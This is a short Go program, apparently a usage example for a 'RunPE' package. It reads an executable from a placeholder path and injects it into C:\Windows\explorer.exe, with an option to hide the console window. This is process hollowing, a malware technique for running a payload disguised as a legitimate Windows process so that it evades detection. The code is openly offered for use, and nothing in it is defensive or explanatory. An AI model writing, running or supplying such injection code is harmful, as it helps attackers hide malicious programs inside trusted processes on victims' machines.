package main

import (
    "pkg/RunPE"
    "io/ioutil"
    "log"
)

func main() {
    src := "C:\\Windows\\explorer.exe"
	pe := "here path to the executable" 
	destpe, err := ioutil.ReadFile(pe)
	if err != nil {
		log.Fatalf("failed to allocate PE File (pe = portable executable): %v", err)
	}
	RunPE.Inject(src, destpe, true) // Console Flag, true / false depends if you want to show or not

}
